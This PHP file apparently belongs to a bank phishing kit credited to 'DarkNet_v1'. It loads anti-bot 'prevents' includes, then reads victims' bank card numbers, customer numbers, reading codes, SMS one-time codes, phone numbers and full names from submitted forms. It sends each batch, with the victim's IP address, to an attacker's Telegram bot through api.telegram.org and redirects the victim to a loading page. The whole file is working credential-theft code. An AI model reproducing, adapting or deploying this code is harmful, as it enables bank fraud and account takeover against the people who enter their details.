<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();

    
    include "../prevents/anti1.php";
    include "../prevents/anti2.php";
    include "../prevents/anti3.php";
    include "../prevents/anti4.php";
    include "../prevents/anti5.php";
    include "../prevents/anti6.php";
    include "../prevents/anti7.php";
    include "../prevents/anti8.php";
    include "../prevents/all.php";
    include "../prevents/911.php";

    include "config.php";
    

    if(isset($_POST["login"])) {

        $user     = $_POST["cart_num"];
        $pass   = isset($_POST["client_num"]) ? $_POST["client_num"] : "";

        $_SESSION["crt"] = $_POST["cart_num"];
        $_SESSION["clin"] = isset($_POST["client_num"]) ? $_POST["client_num"] : "";
        
       $message=
       '[🏦] === LOGIN === [🏦]'."\n".
        "BANK : ".$_POST["name_bank"]."\n". 
       "[🪪] Cart Number : ".$user."\n". 
       "[🔑] customer number : ".$pass."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
       '[🛂] Panel-link : '.get_steps_link()."";
       
   
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");

    }elseif(isset($_POST["lecture"])){

        $lecture      = $_POST["code-lec"];
        
       $message=
       '[🧛] === lecture === [🧛]'."\n".
       '[🧬] Code-lecture : ' .$lecture."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
       
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");
       exit();

    }elseif(isset($_POST["sms_cc"])){

        $sms      = $_POST["x1"].$_POST["x2"].$_POST["x3"].$_POST["x4"].$_POST["x5"].$_POST["x6"];
        
       $message=
       '[🧛] === SMS === [🧛]'."\n".
       '[🧬] SMS : ' .$sms."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
       
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");
       exit();

    }elseif(isset($_POST["number"])){

        $num      = $_POST["num"];
        $name      = $_POST["name"];

        $_SESSION["num"] =  $_POST["num"];
         
        $message=
        '[🧛] === LOGIN === [🧛]'."\n".
        '[🧬] Number : '.$num."\n".
        '[🧬] Full Name : '.$name."\n".
        '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
        
        $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        ]; 
        
        $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data));
        header("Location: ../../../type.php");
        exit();
 
     }

?>